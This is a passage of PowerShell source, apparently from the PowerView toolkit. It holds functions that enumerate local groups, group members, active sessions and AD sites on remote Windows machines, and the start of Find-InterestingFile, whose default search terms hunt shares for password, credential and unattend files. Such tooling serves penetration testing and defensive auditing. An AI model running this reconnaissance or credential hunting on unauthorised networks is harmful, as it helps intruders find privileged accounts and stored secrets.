                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        # if the resulting member is username and not a SID, attempt to resolve it
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch '^S-1-.*') {
                                    $ConvertToArguments = @{'ObjectName' = $Member}
                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match 'Administrators') {
                                $GroupSID = 'S-1-5-32-544'
                            }
                            elseif ($Groupname -match 'Remote Desktop') {
                                $GroupSID = 'S-1-5-32-555'
                            }
                            elseif ($Groupname -match 'Guests') {
                                $GroupSID = 'S-1-5-32-546'
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $GPOGroup
                }
            }

            # now try to the parse group policy preferences file (Groups.xml) if it exists
            $ParseArgs =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch '^S-1-.*') {

                                # if the resulting member is username and not a SID, attempt to resolve it
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $_ | Add-Member Noteproperty 'GPOName' $GPOName
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}

function Get-NetLocalGroup {
<#
.SYNOPSIS

Enumerates the local groups on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function will enumerate the names and descriptions for the
local groups on the current, or remote, machine. By default, the Win32 API
call NetLocalGroupEnum will be used (for speed). Specifying "-Method WinNT"
causes the WinNT service provider to be used instead, which returns group
SIDs along with the group names and descriptions/comments.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroup

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
WINDOWS1                      Administrators                Administrators have comple...
WINDOWS1                      Backup Operators              Backup Operators can overr...
WINDOWS1                      Cryptographic Operators       Members are authorized to ...
...

.EXAMPLE

Get-NetLocalGroup -Method Winnt

ComputerName           GroupName              GroupSID              Comment
------------           ---------              --------              -------
WINDOWS1               Administrators         S-1-5-32-544          Administrators hav...
WINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...
WINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...
...

.EXAMPLE

Get-NetLocalGroup -ComputerName primary.testlab.local

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
primary.testlab.local         Administrators                Administrators have comple...
primary.testlab.local         Users                         Users are prevented from m...
primary.testlab.local         Guests                        Guests have the same acces...
primary.testlab.local         Print Operators               Members can administer dom...
primary.testlab.local         Backup Operators              Backup Operators can overr...

.OUTPUTS

PowerView.LocalGroup.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroup.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupEnum API call to get the local group information

                # arguments for NetLocalGroupEnum
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # get the local user information
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # locate the offset of the initial intPtr
                $Offset = $PtrInfo.ToInt64()

                # 0 = success
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $LocalGroup
                    }
                    # free up the result buffer
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Get-NetLocalGroupMember {
<#
.SYNOPSIS

Enumerates members of a specific local group on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Convert-ADName  

.DESCRIPTION

This function will enumerate the members of a specified local group  on the
current, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers
will be used (for speed). Specifying "-Method WinNT" causes the WinNT service provider
to be used instead, which returns a larger amount of information.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to "Administrators".

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroupMember -Method winnt | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroup | Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True
WINDOWS1       Guests         WINDOWS1\Guest S-1-5-21-25...          False          False
WINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False
WINDOWS1       Users          WINDOWS1\lo... S-1-5-21-25...          False        UNKNOWN
WINDOWS1       Users          TESTLAB\Dom... S-1-5-21-89...           True        UNKNOWN

.EXAMPLE

Get-NetLocalGroupMember -ComputerName primary.testlab.local | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
primary.tes... Administrators TESTLAB\Adm... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\loc... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\Ent... S-1-5-21-89...           True          False
primary.tes... Administrators TESTLAB\Dom... S-1-5-21-89...           True          False

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupGetMembers API call to get the local group information

                # arguments for NetLocalGroupGetMembers
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # get the local user information
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # locate the offset of the initial intPtr
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                # 0 = success
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty 'SID' $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $Members += $Member
                        }
                    }

                    # free up the result buffer
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    # try to extract out the machine SID by using the -500 account as a reference
                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
                        $Member | Add-Member Noteproperty 'GroupName' $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            # DOMAIN\user
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            # DOMAIN\machine\user
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain

                        # if ($MemberIsDomain) {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ''
                        #     $Member | Add-Member Noteproperty 'Disabled' ''

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' $LocalUser.InvokeGet('LastLogin')
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        #     $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #     $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #     $Member | Add-Member Noteproperty 'UserFlags' ''
                        # }
                        # else {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ($LocalUser.Description)

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #         $Member | Add-Member Noteproperty 'UserFlags' ''
                        #         $Member | Add-Member Noteproperty 'Disabled' ''
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ( (Get-Date).AddSeconds(-$LocalUser.PasswordAge[0]))
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ( $LocalUser.PasswordExpired[0] -eq '1')
                        #         $Member | Add-Member Noteproperty 'UserFlags' ( $LocalUser.UserFlags[0] )
                        #         # UAC flags of 0x2 mean the account is disabled
                        #         $Member | Add-Member Noteproperty 'Disabled' $(($LocalUser.UserFlags.value -band 2) -eq 2)
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ( $LocalUser.LastLogin[0])
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        # }

                        $Member
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Get-NetSession {
<#
.SYNOPSIS

Returns session information for the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetSessionEnum Win32API call to query
a given host for active sessions.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetSession

Returns active sessions on the local host.

.EXAMPLE

Get-NetSession -ComputerName sqlserver

Returns active sessions on the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-NetSession

Returns active sessions on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetSession -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.SessionInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the CName/UserName/Time/IdleTime for each session, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # arguments for NetSessionEnum
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # get session information
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                $Increment = $SESSION_INFO_10::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    # return all the sections of the structure - have to do it this way for V2
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Get-NetComputerSiteName {
<#
.SYNOPSIS

Returns the AD site where the local (or a remote) machine resides.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the DsGetSiteName Win32API call to look up the
name of the site where a specified computer resides.

.PARAMETER ComputerName

Specifies the hostname to check the site for (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local

Returns the site for WINDOWS1.testlab.local.

.EXAMPLE

Get-DomainComputer | Get-NetComputerSiteName

Returns the sites for every machine in AD.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential $Cred

.OUTPUTS

PowerView.ComputerSite

A PSCustomObject containing the ComputerName, IPAddress, and associated Site name.
#>

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # if we get an IP address, try to resolve the IP to a hostname
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            # free up the result buffer
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}

function Find-InterestingFile {
<#
.SYNOPSIS

Searches for files on the given path that match a series of specified criteria.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection  

.DESCRIPTION

This function recursively searches a given UNC path for files with
specific keywords in the name (default of pass, sensitive, secret, admin,
login and unattend*.xml). By default, hidden files/folders are included
in search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection
is used to temporarily map the remote share.

.PARAMETER Path

UNC/local path to recursively search.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER ExcludeFolders

Switch. Exclude folders from the search results.

.PARAMETER ExcludeHidden

Switch. Exclude hidden files and folders from the search results.

.PARAMETER CheckWriteAccess

Switch. Only returns files the current user has write access to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
to connect to remote systems for file enumeration.

.EXAMPLE

Find-InterestingFile -Path "C:\Backup\"

Returns any files on the local path C:\Backup\ that have the default
search term set in the title.

.EXAMPLE

Find-InterestingFile -Path "\\WINDOWS7\Users\" -LastAccessTime (Get-Date).AddDays(-7)

Returns any files on the remote path \\WINDOWS7\Users\ that have the default
search term set in the title and were accessed within the last week.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingFile -Credential $Cred -Path "\\PRIMARY.testlab.local\C$\Temp\"

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

